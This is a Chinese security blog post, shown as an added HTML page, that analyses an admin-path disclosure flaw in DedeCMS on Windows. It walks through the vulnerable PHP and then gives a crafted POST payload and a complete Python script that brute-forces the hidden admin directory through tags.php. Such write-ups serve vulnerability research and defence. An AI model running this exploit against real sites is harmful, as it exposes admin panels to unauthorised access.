@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      DedeCMS 后台地址泄露漏洞 
+      
+      
+      |
+    
+     N0puple
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/001.ico">
+    <link rel="icon" href="/images/001.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">N0puple</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">朋友</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">DedeCMS 后台地址泄露漏洞</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2021-06-28 21:02:15
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/php/" title="php">
+                    <b>#</b> php
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/dedecms/" title="dedecms">
+                    <b>#</b> dedecms
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露">
+                    <b>#</b> 信息泄露
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>织梦内容管理系统(Dedecms)是一款PHP开源网站管理系统。dedecms 默认后台地址为 /dede，但很多时候可能会被管理员更改，这时，我们就需要先找到后台地址，本漏洞可以泄露出 dedecms 的后台。</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>仅针对windows系统（这是因为 &lt; 通配符只在 windows 生效），猜测影响全版本</p>
+<p>测试版本 DedeCMS V5.7 SP2</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>问题出在 include/common.inc.php 的 148 行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(DEDEINC.<span class="string">&#x27;/uploadsafe.inc.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上传文件时会请求 include/uploadsafe.inc.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="variable">$keyarr</span> = <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;tmp_name&#x27;</span>, <span class="string">&#x27;size&#x27;</span>);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$_key</span>=&gt;<span class="variable">$_value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$keyarr</span> <span class="keyword">as</span> <span class="variable">$k</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="variable">$_key</span>][<span class="variable">$k</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;Request Error!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( preg_match(<span class="string">&#x27;#^(cfg_|GLOBALS)#&#x27;</span>, <span class="variable">$_key</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;Request var not allow for uploadsafe!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$_key</span> = <span class="variable">$_FILES</span>[<span class="variable">$_key</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_name&#x27;</span>&#125; = <span class="variable">$_FILES</span>[<span class="variable">$_key</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_type&#x27;</span>&#125; = <span class="variable">$_FILES</span>[<span class="variable">$_key</span>][<span class="string">&#x27;type&#x27;</span>] = preg_replace(<span class="string">&#x27;#[^0-9a-z\./]#i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_FILES</span>[<span class="variable">$_key</span>][<span class="string">&#x27;type&#x27;</span>]);</span><br><span class="line">    $&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_size&#x27;</span>&#125; = <span class="variable">$_FILES</span>[<span class="variable">$_key</span>][<span class="string">&#x27;size&#x27;</span>] = preg_replace(<span class="string">&#x27;#[^0-9]#&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_FILES</span>[<span class="variable">$_key</span>][<span class="string">&#x27;size&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_name&#x27;</span>&#125;) &amp;&amp; (preg_match(<span class="string">&quot;#\.(&quot;</span>.<span class="variable">$cfg_not_allowall</span>.<span class="string">&quot;)$#i&quot;</span>,$&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_name&#x27;</span>&#125;) || !preg_match(<span class="string">&quot;#\.#&quot;</span>, $&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_name&#x27;</span>&#125;)) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!defined(<span class="string">&#x27;DEDEADMIN&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;Not Admin Upload filetype not allow !&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_size&#x27;</span>&#125;))</span><br><span class="line">    &#123;</span><br><span class="line">        $&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_size&#x27;</span>&#125; = @filesize(<span class="variable">$$_key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$imtypes</span> = <span class="keyword">array</span></span><br><span class="line">    (</span><br><span class="line">        <span class="string">&quot;image/pjpeg&quot;</span>, <span class="string">&quot;image/jpeg&quot;</span>, <span class="string">&quot;image/gif&quot;</span>, <span class="string">&quot;image/png&quot;</span>, </span><br><span class="line">        <span class="string">&quot;image/xpng&quot;</span>, <span class="string">&quot;image/wbmp&quot;</span>, <span class="string">&quot;image/bmp&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(in_array(strtolower(trim($&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_type&#x27;</span>&#125;)), <span class="variable">$imtypes</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$image_dd</span> = @getimagesize(<span class="variable">$$_key</span>);</span><br><span class="line">        <span class="comment">//问题就出在此处，获取不到就会报错退出</span></span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$image_dd</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;Upload filetype not allow !&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先会解析 <code>$_FILES</code> 的值，需要满足 <code>$_FILES[$key]</code> 一定要存在数组 <code>$keyarr</code>  中的这些键</p>
+<p>然后就是不允许 <code>$key</code> 等于 cfg_ 或者 GLOBALS，这里防止了一部分的变量覆盖，因为之后就会 <code>$$key</code></p>
+<p>接下来就是一些取值，比较简单，然后给了一个文件类型的白名单，必须满足是这些类型，最后来到出问题的位置，获取图片的大小，获取不到就报错，这里的话，由于 <code>$_FILES</code> 的值可控，也就是 <code>$$key</code> 的值可控，既然文件名可控，那么我们就可以利用这里判断是不是存在某文件，再利用通配符，我们就可以获取到后台的地址 </p>
+<h3 id="PHP在Windows上的一些奇妙特性"><a href="#PHP在Windows上的一些奇妙特性" class="headerlink" title="PHP在Windows上的一些奇妙特性"></a>PHP在Windows上的一些奇妙特性</h3><p>这里我们需要了解一下 php 在windows上的一些奇妙特性 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12868197.html">WINDOWS文件通配符分析</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">大于号(&gt;)相等于通配符问号(?)</span><br><span class="line">小于号(&lt;)相当于通配符星号(*)</span><br><span class="line">双引号(&quot;)相当于点字符(.)</span><br></pre></td></tr></table></figure>
+
+<p>首先我们需要知道我们使用了文件操作函数，然后PHP的文件操作函数均调用了opendir</p>
+<p><code>opendir(win32readdir.c)</code> 使用了 <code>windows</code> 的 <code>FindFirstFile（API)</code> ，然后在FindFirstFile（API)中进行了如下的定义：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;  The following constants provide addition meta characters to fully</span><br><span class="line">&#x2F;&#x2F;  support the more obscure aspects of DOS wild card processing.</span><br><span class="line"></span><br><span class="line">#define DOS_STAR        (L&#39;&lt;&#39;)</span><br><span class="line">#define DOS_QM          (L&#39;&gt;&#39;)</span><br><span class="line">#define DOS_DOT         (L&#39;&quot;&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>于是我们的这三个符号在对php文件操作时就有了特殊含义</p>
+<p>我们的这里使用了 getimagesize 函数，刚好他是文件操作，我们我们可以使用通配符 &lt;</p>
+<p>很多地方说的都是 &lt; 只通配一个字符，但实际尝试中却是可以通配多个字符</p>
+<h3 id="payload-构造"><a href="#payload-构造" class="headerlink" title="payload 构造"></a>payload 构造</h3><p>只要包含了 include/common.inc.php 的文件就可以被利用，没有其他特殊条件，这里我们可以选取 tags.php</p>
+<p>在前面的文章中说过，每一个 GET 或者 POST 的参数都会进行如下处理</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_k</span> == <span class="string">&#x27;nvarname&#x27;</span>) $&#123;<span class="variable">$_k</span>&#125; = <span class="variable">$_v</span>;</span><br><span class="line">        <span class="keyword">else</span> $&#123;<span class="variable">$_k</span>&#125; = _RunMagicQuotes(<span class="variable">$_v</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此，我们的 <code>$_FILES</code> 也可以通过这种形式来获取，POST 一个 <code>_FILES[a][tmp_name]</code> 就可以实现</p>
+<p>这里还有一个简单的绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_name&#x27;</span>&#125;) &amp;&amp; (preg_match(<span class="string">&quot;#\.(&quot;</span>.<span class="variable">$cfg_not_allowall</span>.<span class="string">&quot;)$#i&quot;</span>,$&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_name&#x27;</span>&#125;) || !preg_match(<span class="string">&quot;#\.#&quot;</span>, $&#123;<span class="variable">$_key</span>.<span class="string">&#x27;_name&#x27;</span>&#125;)) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!defined(<span class="string">&#x27;DEDEADMIN&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;Not Admin Upload filetype not allow !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们这里必然是没有定义 DEDEADMIN 的，因此我们需要绕过，最简单的就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[a][name]=<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>因此我们可以构造 payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_FILES[a][tmp_name]&#x3D;.&#x2F;de&lt;&#x2F;images&#x2F;image.gif&amp;_FILES[a][name]&#x3D;&amp;_FILES[a][type]&#x3D;image&#x2F;gif&amp;_FILES[a][size]&#x3D;10</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>如果通配符只匹配一个字符，但刚好有文件夹的第一个字符与后台地址的第一个字符相同，那么将得不到结果，所以最好是先确定两个字符，因为只针对 windows，windows大小写不敏感，所以只需要小写字母+数字就行，图片文件需要是真实存在的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span>(<span class="params">payload</span>):</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;_FILES[a][tmp_name]&#x27;</span>: payload,</span><br><span class="line">        <span class="string">&#x27;_FILES[a][name]&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;_FILES[a][type]&#x27;</span>: <span class="string">&#x27;image/gif&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;_FILES[a][size]&#x27;</span>: <span class="string">&#x27;10&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAdmin</span>(<span class="params">url</span>):</span></span><br><span class="line">    dic = string.digits + string.ascii_lowercase</span><br><span class="line">    path = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            payload = <span class="string">&#x27;./&#x27;</span> + i + j + <span class="string">&#x27;&lt;/images/image.gif&#x27;</span></span><br><span class="line">            data = getData(payload)</span><br><span class="line">            html = s.post(url + <span class="string">&#x27;/tags.php&#x27;</span>, data=data).text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Upload filetype not allow !&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> html:</span><br><span class="line">                path = i + j</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span> + url + <span class="string">&quot;/&quot;</span> + path)</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">            payload = <span class="string">&#x27;./&#x27;</span> + path + i + <span class="string">&#x27;&lt;/images/image.gif&#x27;</span></span><br><span class="line">            data = getData(payload)</span><br><span class="line">            html = s.post(url + <span class="string">&#x27;/tags.php&#x27;</span>, data=data).text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Upload filetype not allow !&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> html:</span><br><span class="line">                path = path + i</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span> + url + <span class="string">&quot;/&quot;</span> + path)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> s.get(url + <span class="string">&#x27;/&#x27;</span> + path + <span class="string">&#x27;/images/image.gif&#x27;</span>).status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/dedecms&#x27;</span></span><br><span class="line">    getAdmin(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/06/27/DedeCMS-V5-7-%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-7700%EF%BC%89/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2021-06-28 21:02:15
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/php/" title="php">
+                        <b>#</b> php
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/dedecms/" title="dedecms">
+                        <b>#</b> dedecms
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露">
+                        <b>#</b> 信息泄露
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2021/06/28/DedeCMS-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D"><span class="toc-text">漏洞影响</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%9C%A8Windows%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E5%A6%99%E7%89%B9%E6%80%A7"><span class="toc-text">PHP在Windows上的一些奇妙特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-%E6%9E%84%E9%80%A0"><span class="toc-text">payload 构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp"><span class="toc-text">Exp</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/N0puple/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="tudouqunaliwa@163.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/N0puple/">Copyright © N0puple 2020</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
